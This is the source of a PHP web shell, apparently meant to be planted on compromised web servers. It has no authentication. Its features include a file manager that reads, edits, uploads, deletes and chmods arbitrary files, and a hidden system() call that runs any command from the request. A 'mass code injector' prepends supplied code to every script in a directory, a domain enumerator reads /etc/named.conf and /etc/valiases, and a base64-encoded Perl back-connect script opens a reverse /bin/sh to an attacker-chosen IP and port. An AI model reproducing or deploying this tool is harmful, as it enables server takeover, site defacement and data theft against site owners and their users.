<?php
session_start();

echo '<!DOCTYPE HTML>
<html>
<head>
<link href="" rel="stylesheet" type="text/css">
<title>AI Project v1.0</title>
<style>
body{
background-color: black;
color:white;
}
#content tr:hover{
background-color: red;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: red;
}
table{
border: 1px #000000 dotted;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</head>
<body>
<h1><center><font color="aqua">AI Project v1.0</font></center></h1>

<center>
			<a href="?server_info">
				<input type="submit" value="Server Info" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?file_manager">
				<input type="submit" value="File Manager" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?php_info">
				<input type="submit" value="Php Info" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?mass_injector">
				<input type="submit" value="Code Injector" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?uploader">
				<input type="submit" value="Uploader" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?domains">
				<input type="submit" value="Domains" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?back_connecter">
				<input type="submit" value="Back Connecter" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?die">
				<input type="submit" value="Die" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
</center><br><br>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>';

if(isset($_GET['server_info'])) {
		echo "<center><br><br>
						<font style='color: red; font-size: 130%;'>Uname: ".php_uname()."</font><br>
						<font style='color: silver; font-size: 130%;'>Browser: ".$_SERVER['HTTP_USER_AGENT']."</font><br>
						<font style='color: lawngreen; font-size: 130%;'>Server Software: ".$_SERVER['SERVER_SOFTWARE']."</font><br>
						<font style='color: red; font-size: 130%;'>Server IP: ".$_SERVER['SERVER_ADDR']."</font><br>
						<font style='color: lawngreen; font-size: 130%;'>User IP: ".$_SERVER['REMOTE_ADDR']."</font><br>
						<font style='color: red; font-size: 130%;'>User: ".@get_current_user()."</font><br>
											</center></font></center>";
}


//file upload
if(isset($_FILES['file'])){
		if(copy($_FILES['file']['tmp_name'], $_SESSION['path'].'/'.$_FILES['file']['name'])){
				echo '<font color="green">Upload Berhasil lihat di: '.$_SESSION['path'].'</font><br />';
   }else{
     	echo '<font color="red">Upload Gagal</font><br/>';
   }
   unset($_SESSION['path']);
}
if (isset($_GET['uploader'])) {
		 
		 echo '<form enctype="multipart/form-data" method="POST">
		 <font color="white">File Upload :</font> 
		 <input type="file" name="file" />
		 <h3>path: '.$_SESSION['path'].'
		 <input type="submit" value="upload" /></form></td></tr>';
}

//filemanager
if(isset($_GET['path']) || isset($_GET['file_manager'])){
   if (isset($_GET['path'])) {
   		$path = $_GET['path'];
   } else {
   		$path = getcwd();
   }
   
   $_SESSION['path'] = $path;
   
   if (isset($_SESSION['copy']) || isset($_SESSION['move'])) {
   		if (isset($_SESSION['copy'])) {
   				echo "<form method='post' action=''><input type='submit' name='paste' value='Paste Copy'></input></form><br><br>";
   		} else {
   				echo "<form method='post' action=''><input type='submit' name='paste' value='Paste Move'></input></form><br><br>";
   		}
   
   }
   if (isset($_SESSION['copy']) && isset($_POST['paste']))
		{
				$source = $_SESSION['copy'];
				$destin = $path."/".$_SESSION['copy_name'];
				
				if (copy($source, $destin)) {
						unset($_SESSION['copy']);
						unset($_SESSION['copy_name']);
						echo "<script>alert('sukses copy s=".$source." d=".$destin."');</script>	";
						echo("<script>location.href = '/ai.php?path=$path';</script>");
				
				} else {
						echo "<font color='red'> copy file gagal</font>	";
				}
		}
		elseif (isset($_SESSION['move']) && isset($_POST['paste']))
		{
				$source = $_SESSION['move'];
				$destin = $path."/".$_SESSION['move_name'];
				
				if (copy($source, $destin)) {
						unset($_SESSION['move']);
						unset($_SESSION['move_name']);
						
						unlink($source);
						echo "<script>alert('sukses move s=".$source." d=".$destin."');</script>	";
						echo("<script>location.href = '/ai.php?path=$path';</script>");
				
				} else {
						echo "<font color='red'> Move file gagal</font>	";
				}
		}
   
		$path = str_replace('\\','/',$path);
		$paths = explode('/',$path);

		foreach($paths as $id=>$pat){
				if($pat == '' && $id == 0){
						$a = true;
						echo '<a href="?path=/">/</a>';
						continue;
   		}
  		 if($pat == '') continue;
   		echo '<a href="?path=';
   		for($i=0;$i<=$id;$i++){
   				echo "$paths[$i]";
   				if($i != $id) echo "/";
  		  }
   
   		echo '">'.$pat.'</a>/';
		}
		
		echo '<td><form method="POST" action="?option&path='.$path.'">
					<select name="new">
					<option value="">New</option>
					<option value="file">File</option>
					<option value="folder">Folder</option>
					</select>
					<input type="submit" value=">">
					</form></td>';
					
		echo '</td></tr><tr><td>';

		//editor text
		if(isset($_GET['filesrc'])){
				echo "<tr><td>Current File : ";
				echo $_GET['filesrc'];
				echo '</tr></td></table><br />';
				echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');

		}
		elseif(isset($_GET['option']) && $_POST['new'] == 'file') {
				echo '<form method="POST">New File : <input name="newfile" type="text" size="20" value="'.$_POST['name'].'" /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';
		}
		elseif(isset($_GET['option']) && $_POST['new'] == 'folder') {
				echo '<form method="POST">New Folder : 
								<input name="newfolder" type="text" size="20" value="'.$path.'" />
								<input type="hidden" name="path" value="'.$_POST['path'].'">
								<input type="hidden" name="opt" value="rename">
								<input type="submit" value="Go" /></form>';
				$new = $_POST['newfolder'];
				echo $new;
				/*if (fm_mkdir($path . '/' . $new, false) === true) {
          echo '<font color="green">Folder created</font>';
      } elseif (fm_mkdir($path . '/' . $new, false) === $path . '/' . $new) {
          echo '<font color="pink">Folder already exists</font>';
      } else {
          echo '<font color="red">Folder not created';
      }*/
		}
		elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
   		echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
  		 if($_POST['opt'] == 'chmod'){
   				if(isset($_POST['perm'])){
     					if(chmod($_POST['path'],$_POST['perm'])){
         		   echo '<font color="green">Change Permission Berhasil</font><br/>';
        		 }else{
            		echo '<font color="red">Change Permission Gagal</font><br />';
        		 }
     		 }
    		  echo '<form method="POST">Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="chmod"><input type="submit" value="Go" /></form>';
		
				}elseif($_POST['opt'] == 'rename'){
      			if(isset($_POST['newname'])){
          		if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
             		echo '<font color="green">Ganti Nama Berhasil</font><br/>';
         		 }else{
             		echo '<font color="red">Ganti Nama Gagal</font><br />';
          		}
         		 $_POST['name'] = $_POST['newname'];
   	   		}
     			 echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';

		   }elseif($_POST['opt'] == 'edit'){
      			if(isset($_POST['src'])){
          		$fp = fopen($_POST['path'],'w');
         			if(fwrite($fp,$_POST['src'])){
            			 echo '<font color="green">Berhasil Edit File</font><br/>';
          		}else{
             		 echo '<font color="red">Gagal Edit File</font><br/>';
          		}
          		fclose($fp);
    				  }
     				 echo '<form method="POST"><textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Save" /></form>';
  		 
  		 }elseif($_POST['opt'] == 'download') {
   					$path = $_POST['path'];
        		echo("<script>location.href = '/download.php?id=$path';</script>");

 		  }elseif($_POST['opt'] == 'copy') {
 		  				$_SESSION['copy'] = $path.'/'.$_POST['name'];
 		  				$_SESSION['copy_name'] = $_POST['name'];
 		  				echo("<script>location.href = '/ai.php?file_manager';</script>");
 		  }
 		  
 		  elseif($_POST['opt'] == 'move') {
 		  				$_SESSION['move'] = $path.'/'.$_POST['name'];
 		  				$_SESSION['move_name'] = $_POST['name'];
 		  				echo("<script>location.href = '/ai.php?file_manager';</script>");
 		  }
 		  
  		 echo '</center>';

		}else{
				echo '</table><br/><center>';
  	  		if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
      		 if($_POST['type'] == 'dir'){
             if(rmdir($_POST['path'])){
                  echo '<font color="green">Directory Terhapus</font><br/>';
             }else{
                 	 echo '<font color="red">Directory Gagal Terhapus</font><br/>';
									}
					}elseif($_POST['type'] == 'file'){
									if(unlink($_POST['path'])){
													echo '<font color="green">File Terhapus</font><br/>';
									}else{
													echo '<font color="red">File Gagal Dihapus</font><br/>';
									}
					}
		}
		echo '</center>';
		$scandir = scandir($path);
		
		echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
		<tr class="first">
		<td><center>Name</peller></center></td>
		<td><center>Size</peller></center></td>
		<td><center>Permission</peller></center></td>
		<td><center>Modify</peller></center></td>
		</tr>';

		foreach($scandir as $dir){
					if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
				
					echo '<tr>
					<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
					<td><center>--</center></td>
					<td><center>';
											
					if(is_writable($path.'/'.$dir)) echo '<font color="green">';
					elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
											
					echo perms($path.'/'.$dir);
					if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
											
					echo '</center></td>
					<td><center><form method="POST" action="?option&path='.$path.'">
					<select name="opt">
					<option value="">Select</option>
					<option value="delete">Delete</option>
					<option value="chmod">Chmod</option>
					<option value="rename">Rename</option>
					<option value="copy">Copy</option>
					<option value="zip">zip/tar</option>
					</select>
					<input type="hidden" name="type" value="dir">
					<input type="hidden" name="name" value="'.$dir.'">
					<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
					<input type="submit" value=">">
					</form></center></td>
					</tr>';
		}

		echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
		foreach($scandir as $file){
					if(!is_file($path.'/'.$file)) continue;
					$size = filesize($path.'/'.$file)/1024;
					$size = round($size,3);
											
					if($size >= 1024){
								$size = round($size/1024,2).' MB';
					}else{
								$size = $size.' KB';
					}

					echo '<tr>
					<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
					<td><center>'.$size.'</center></td>
					<td><center>';
											
					if(is_writable($path.'/'.$file)) echo '<font color="green">';
					elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
											
					echo perms($path.'/'.$file);
					if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
											
					echo '</center></td>
					<td><center><form method="POST" action="?option&path='.$path.'">
					<select name="opt">
					<option value="">Select</option>
					<option value="delete">Delete</option>
					<option value="chmod">Chmod</option>
					<option value="rename">Rename</option>
					<option value="edit">Edit</option>
					<option value="copy">Copy</option>
					<option value="move">Move</option>
					<option value="download">Download</option>
					</select>
					<input type="hidden" name="type" value="file">
					<input type="hidden" name="name" value="'.$file.'">
					<input type="hidden" name="path" value="'.$path.'/'.$file.'">
					<input type="submit" value=">">
					</form></center></td>
					</tr>';			
		}
		echo '</table>
		</div>';
		}
}
echo '
</body>
</html>';
					
if (isset($_GET['php_info'])) {
		echo phpinfo();
}

if (isset($_GET['mass_injector'])) {
		echo "<br><center><br>
							<font style='color: teal; font-family: cursive; font-size: 200%;'>ReV Mass Code Injector V2.0</font><br><br>
							<form action='' method='POST'>";

		$_ec5b37e72301 = '';
		if (isset($_REQUEST[cmd])) {
				system ($_REQUEST[cmd]);
		}
		echo "<textarea type='text' name='code' rows='13' cols='80' placeholder='Enter Your Code Like This : ".$_ec5b37e72301."'></textarea><br><br>".
					 "<input style='font-size: 90%;' type='submit' name='submit' value='Submit' />
						</form>";
		if (isset($_POST['submit'])) {
				$_e04f8301a9f1 = $_POST['code'];
				$_9f7af403d39c = base64_encode($_e04f8301a9f1);
				$_d586cea720c2 = getcwd();
				$_959a28065435 = 'http://'.$_SERVER['HTTP_HOST'];
				$_da84e8d0e5e8 = $_SERVER['SCRIPT_NAME'];
				$_d394e1453852 = $_959a28065435.$_da84e8d0e5e8;
				$_d586cea720c2 = getcwd();
				$_3528fced53a2 = $_d586cea720c2;
				if (empty($_e04f8301a9f1)) {
							echo '<font size=\'50%\' face=\'cursive\' color=\'red\'>You need to input something !!! :P</font>';
				}
				if (!empty($_e04f8301a9f1)) {
							if ($_84c54f971273 = opendir($_3528fced53a2)) {
									echo 'Website: '.$_d394e1453852.'<br><br>';
									echo 'Looking in '.$_3528fced53a2.'<br>';
									
									while ($_fb803b5db2a0 = readdir($_84c54f971273)) {
											if ($_fb803b5db2a0 != '.' && 
													 $_fb803b5db2a0 != '..' && 
													 $_fb803b5db2a0 != 'rev.php' && 
													 $_fb803b5db2a0 != 'REV.php' && 
													 $_fb803b5db2a0 != '.htaccess' && 
													 $_fb803b5db2a0 != 'php.ini' && 
													 $_fb803b5db2a0 != 'admin' && 
													 $_fb803b5db2a0 != 'images' && 
													 $_fb803b5db2a0 != 'image' && 
													 $_fb803b5db2a0 != 'img' && 
													 $_fb803b5db2a0 != 'phpmyadmin' && 
													 $_fb803b5db2a0 != 'files' && 
													 $_fb803b5db2a0 != '.ftpquota' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'xml' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'jpg' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'ico' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'png' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'jpeg' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'txt' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'exe' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'html' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'shtml' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'htm' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'ico' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'css' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'zip' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'sql' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'js' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'py' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'pl' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'md' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'gif' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'tar.gz' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'c' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'sql.zip' && 
													 strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'out') {
													 	
													 	echo '<a style="color: red; font-family: cursive;" target="_blank" href="'.$_fb803b5db2a0.'">'.$_fb803b5db2a0.'</a><font size="" color="lawngreen" face="cursive">&nbsp;&nbsp;&nbsp&nbsp;Is Injected</font><br />';
													 	$_c4f3394d1c6c = base64_decode($_9f7af403d39c);
													 	$_c4f3394d1c6c .= file_get_contents($_fb803b5db2a0);
													 	file_put_contents($_fb803b5db2a0, $_c4f3394d1c6c); 
													 	echo '<br><br><br>';
												}
										} //while
								}
					} //empty
			}
}

if (isset($_GET['domains'])) { 
		if(strtolower(substr(PHP_OS,0,3)) == "win") {
				$_f3d329025a5d = 'win';
		}else {
				$_f3d329025a5d = 'nix';
		} 
		
		if ($_f3d329025a5d == 'win') {
				echo "<center><br><br><font style='color: white; font-size: 200%;'>Ooopppss Windows Server :P<br>You Better Find Linux :P </font></center>";
		}
		else {
				if (isset($_GET['domains'])) {
						$_db30bcba387e = @implode(@file("/etc/named.conf"));
						$_549674eea689 = "/var/named";
						if (!$_db30bcba387e) {
								$_fb0dd6286113 = scandir($_549674eea689);
								$_74ba591cb2f1=1;
								$_cbd11b654fbf = 0; 
								echo "<table align=center border=1 width=59% cellpadding=5>
								<tr><td colspan=2><center>There are : ( <b>" . count($_fb0dd6286113) . "</b> ) Domains in this Sever.</center></td></tr>
								<tr><td>No</td><td>Domain</td><td>User</td></tr>";
					
								foreach ($_fb0dd6286113 as &$_abf6e8a6ebfa) { 
										if (stripos($_abf6e8a6ebfa,".db")) { 
												$_abf6e8a6ebfa = str_replace('.db','',$_abf6e8a6ebfa); 
										} 
										if (strlen($_abf6e8a6ebfa) > 6) { 
												echo "<tr><td>".$_74ba591cb2f1++."</td><td><a href='http://".$_abf6e8a6ebfa."' target='_blank'>".$_abf6e8a6ebfa."</a></td><td>User</td></tr>"; 
										} 
								} 
								
								echo "</table>";
						} 
						else{ 
								$_74ba591cb2f1 = 1; 
								preg_match_all("#named/(.*?).db#", $_db30bcba387e, $_6fb5fe1b7448); 
								$_fb0dd6286113 = array_unique($_6fb5fe1b7448[1]); 
								echo "<table align=center border=1 width=59% cellpadding=5>
								<tr><td colspan=2> There are  ( <b>" . count($_fb0dd6286113) . "</b> ) Domains in this Sever.I think you have got something this time yeah!!!.</td></tr>
								<tr><td>No</td><td>Domain</td><td>User</td></tr>"; 
								
								foreach ($_fb0dd6286113 as $_abf6e8a6ebfa) { 
										$_1653139bda87 = posix_getpwuid(@fileowner("/etc/valiases/" . $_abf6e8a6ebfa)); 
										echo "<tr><td>".$_74ba591cb2f1++."</td><td><a href='http://".$_abf6e8a6ebfa."' target='_blank'>".$_abf6e8a6ebfa."</a></td><td>".$_1653139bda87['name']."</td></tr>"; 
										echo "</font><br><br><br>";
 								}
 						}
 				} 
 		} 
}

if (isset($_GET['back_connecter'])) {
		$_0c5e3246e473="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
		echo "<center><br><br><form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\" method='POST'><span style='font-family: cursive; font-size: 200%; color: white;'>Back-Connecter Via Perl</span><br/><br>Your Ip: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'><br><br> Port to bind: <input type='text' name='port' value='110'><br><br><input type=submit name='backconnect' value='Submit'></form><br>";
		if(isset($_POST['backconnect'])) {
				function cf($_e0887aa7bc0b,$_9c65822c9127) {
						$_dfb1f07e894f = @fopen($_e0887aa7bc0b,"w") or @function_exists('file_put_contents');
						if($_dfb1f07e894f){
								@fwrite($_dfb1f07e894f,@base64_decode($_9c65822c9127));
								@fclose($_dfb1f07e894f);
						}
				}
				
				function An0n3xPloiTeR($_6d1b263a32f3) {
						$_1765c46dda35 = '';
						if (function_exists('exec')) {
								@exec($_6d1b263a32f3,$_1765c46dda35);
								$_1765c46dda35 = @join("\n",$_1765c46dda35);
			
						} elseif (function_exists('passthru')) {
								ob_start();
								@passthru($_6d1b263a32f3);
								$_1765c46dda35 = ob_get_clean();
								
						} elseif (function_exists('system')) {
								ob_start();
								@system($_6d1b263a32f3);
								$_1765c46dda35 = ob_get_clean();
						
						} elseif (function_exists('shell_exec')) {
								$_1765c46dda35 = shell_exec($_6d1b263a32f3);
								
						} elseif (is_resource($_e0887aa7bc0b = @popen($_6d1b263a32f3,"r"))) {
								$_1765c46dda35 = "";
								while(!@feof($_e0887aa7bc0b))$_1765c46dda35 .= fread($_e0887aa7bc0b,1024);
										pclose($_e0887aa7bc0b);
								}
								return $_1765c46dda35;
						}
						
						if($_POST['backconnect']) {
								cf("/tmp/bc.pl",$_0c5e3246e473);
								$_1765c46dda35 = An0n3xPloiTeR("perl /tmp/bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &"); 
								sleep(1);
								echo "<pre class=ml1>$_1765c46dda35\n".An0n3xPloiTeR("ps aux | grep bc.pl")."</pre>"; 
								unlink("/tmp/bc.pl"); //ini meragukan
						}
			} //function
}


function perms($file){
		$perms = fileperms($file);

		if (($perms & 0xC000) == 0xC000) {
				// Socket
				$info = 's';
		} elseif (($perms & 0xA000) == 0xA000) {
				// Symbolic Link
				$info = 'l';
		} elseif (($perms & 0x8000) == 0x8000) {
				// Regular
				$info = '-';
		} elseif (($perms & 0x6000) == 0x6000) {
				// Block special
				$info = 'b';
		} elseif (($perms & 0x4000) == 0x4000) {
				// Directory
				$info = 'd';
		} elseif (($perms & 0x2000) == 0x2000) {
				// Character special
				$info = 'c';
		} elseif (($perms & 0x1000) == 0x1000) {
				// FIFO pipe
				$info = 'p';
		} else {
				// Unknown
				$info = 'u';
		}

		// Owner
		$info .= (($perms & 0x0100) ? 'r' : '-');
		$info .= (($perms & 0x0080) ? 'w' : '-');
		$info .= (($perms & 0x0040) ?
		(($perms & 0x0800) ? 's' : 'x' ) :
		(($perms & 0x0800) ? 'S' : '-'));

		// Group
		$info .= (($perms & 0x0020) ? 'r' : '-');
		$info .= (($perms & 0x0010) ? 'w' : '-');
		$info .= (($perms & 0x0008) ?
		(($perms & 0x0400) ? 's' : 'x' ) :
		(($perms & 0x0400) ? 'S' : '-'));

		// World
		$info .= (($perms & 0x0004) ? 'r' : '-');
		$info .= (($perms & 0x0002) ? 'w' : '-');
		$info .= (($perms & 0x0001) ?
		(($perms & 0x0200) ? 't' : 'x' ) :
		(($perms & 0x0200) ? 'T' : '-'));

		return $info;
}
/**
 * Delete  file or folder (recursively)
 * @param string $path
 * @return bool
 */
function fm_rdelete($path)
{
    if (is_link($path)) {
        return unlink($path);
    } elseif (is_dir($path)) {
        $objects = scandir($path);
        $ok = true;
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' && $file != '..') {
                    if (!fm_rdelete($path . '/' . $file)) {
                        $ok = false;
                    }
                }
            }
        }
        return ($ok) ? rmdir($path) : false;
    } elseif (is_file($path)) {
        return unlink($path);
    }
    return false;
}

/**
 * Recursive chmod
 * @param string $path
 * @param int $filemode
 * @param int $dirmode
 * @return bool
 * @todo Will use in mass chmod
 */
function fm_rchmod($path, $filemode, $dirmode)
{
    if (is_dir($path)) {
        if (!chmod($path, $dirmode)) {
            return false;
        }
        $objects = scandir($path);
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' && $file != '..') {
                    if (!fm_rchmod($path . '/' . $file, $filemode, $dirmode)) {
                        return false;
                    }
                }
            }
        }
        return true;
    } elseif (is_link($path)) {
        return true;
    } elseif (is_file($path)) {
        return chmod($path, $filemode);
    }
    return false;
}

/**
 * Safely rename
 * @param string $old
 * @param string $new
 * @return bool|null
 */
function fm_rename($old, $new)
{
    $allowed = (FM_EXTENSION) ? explode(',', FM_EXTENSION) : false;

    $ext = pathinfo($new, PATHINFO_EXTENSION);
    $isFileAllowed = ($allowed) ? in_array($ext, $allowed) : true;

    if(!$isFileAllowed) return false;

    return (!file_exists($new) && file_exists($old)) ? rename($old, $new) : null;
}

/**
 * Copy file or folder (recursively).
 * @param string $path
 * @param string $dest
 * @param bool $upd Update files
 * @param bool $force Create folder with same names instead file
 * @return bool
 */
function fm_rcopy($path, $dest, $upd = true, $force = true)
{
    if (is_dir($path)) {
        if (!fm_mkdir($dest, $force)) {
            return false;
        }
        $objects = scandir($path);
        $ok = true;
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' && $file != '..') {
                    if (!fm_rcopy($path . '/' . $file, $dest . '/' . $file)) {
                        $ok = false;
                    }
                }
            }
        }
        return $ok;
    } elseif (is_file($path)) {
        return fm_copy($path, $dest, $upd);
    }
    return false;
}

/**
 * Safely create folder
 * @param string $dir
 * @param bool $force
 * @return bool
 */
function fm_mkdir($dir, $force)
{
    if (file_exists($dir)) {
        if (is_dir($dir)) {
            return $dir;
        } elseif (!$force) {
            return false;
        }
        unlink($dir);
    }
    return mkdir($dir, 0777, true);
}

/**
 * Safely copy file
 * @param string $f1
 * @param string $f2
 * @param bool $upd
 * @return bool
 */
function fm_copy($f1, $f2, $upd)
{
    $time1 = filemtime($f1);
    if (file_exists($f2)) {
        $time2 = filemtime($f2);
        if ($time2 >= $time1 && $upd) {
            return false;
        }
    }
    $ok = copy($f1, $f2);
    if ($ok) {
        touch($f2, $time1);
    }
    return $ok;
}

/**
 * Get mime type
 * @param string $file_path
 * @return mixed|string
 */
function fm_get_mime_type($file_path)
{
    if (function_exists('finfo_open')) {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime = finfo_file($finfo, $file_path);
        finfo_close($finfo);
        return $mime;
    } elseif (function_exists('mime_content_type')) {
        return mime_content_type($file_path);
    } elseif (!stristr(ini_get('disable_functions'), 'shell_exec')) {
        $file = escapeshellarg($file_path);
        $mime = shell_exec('file -bi ' . $file);
        return $mime;
    } else {
        return '--';
    }
}

/**
 * HTTP Redirect
 * @param string $url
 * @param int $code
 */
function fm_redirect($url, $code = 302)
{
    header('Location: ' . $url, true, $code);
    exit;
}

/**
 * Path traversal prevention and clean the url
 * It replaces (consecutive) occurrences of / and \\ with whatever is in DIRECTORY_SEPARATOR, and processes /. and /.. fine.
 * @param $path
 * @return string
 */
function get_absolute_path($path) {
    $path = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $path);
    $parts = array_filter(explode(DIRECTORY_SEPARATOR, $path), 'strlen');
    $absolutes = array();
    foreach ($parts as $part) {
        if ('.' == $part) continue;
        if ('..' == $part) {
            array_pop($absolutes);
        } else {
            $absolutes[] = $part;
        }
    }
    return implode(DIRECTORY_SEPARATOR, $absolutes);
}

/**
 * Clean path
 * @param string $path
 * @return string
 */
function fm_clean_path($path)
{
    $path = trim($path);
    $path = trim($path, '\\/');
    $path = str_replace(array('../', '..\\'), '', $path);
    $path =  get_absolute_path($path);
    if ($path == '..') {
        $path = '';
    }
    return str_replace('\\', '/', $path);
}

/**
 * Get parent path
 * @param string $path
 * @return bool|string
 */
function fm_get_parent_path($path)
{
    $path = fm_clean_path($path);
    if ($path != '') {
        $array = explode('/', $path);
        if (count($array) > 1) {
            $array = array_slice($array, 0, -1);
            return implode('/', $array);
        }
        return '';
    }
    return false;
}

/*
 * get language translations from json file
 * @param int $tr
 * @return array
 */
function fm_get_translations($tr) {
    try {
        $content = @file_get_contents('translation.json');
        if($content !== FALSE) {
            $lng = json_decode($content, TRUE);
            global $lang_list;
            foreach ($lng["language"] as $key => $value)
            {
                $code = $value["code"];
                $lang_list[$code] = $value["name"];
                if ($tr)
                    $tr[$code] = $value["translation"];
            }
            return $tr;
        }

    }
    catch (Exception $e) {
        echo $e;
    }
}

/**
 * @param $file
 * Recover all file sizes larger than > 2GB.
 * Works on php 32bits and 64bits and supports linux
 * @return int|string
 */
function fm_get_size($file)
{
    static $iswin;
    if (!isset($iswin)) {
        $iswin = (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN');
    }

    static $exec_works;
    if (!isset($exec_works)) {
        $exec_works = (function_exists('exec') && !ini_get('safe_mode') && @exec('echo EXEC') == 'EXEC');
    }

    // try a shell command
    if ($exec_works) {
        $cmd = ($iswin) ? "for %F in (\"$file\") do @echo %~zF" : "stat -c%s \"$file\"";
        @exec($cmd, $output);
        if (is_array($output) && ctype_digit($size = trim(implode("\n", $output)))) {
            return $size;
        }
    }

    // try the Windows COM interface
    if ($iswin && class_exists("COM")) {
        try {
            $fsobj = new COM('Scripting.FileSystemObject');
            $f = $fsobj->GetFile( realpath($file) );
            $size = $f->Size;
        } catch (Exception $e) {
            $size = null;
        }
        if (ctype_digit($size)) {
            return $size;
        }
    }

    // if all else fails
    return filesize($file);
}

/**
 * Get nice filesize
 * @param int $size
 * @return string
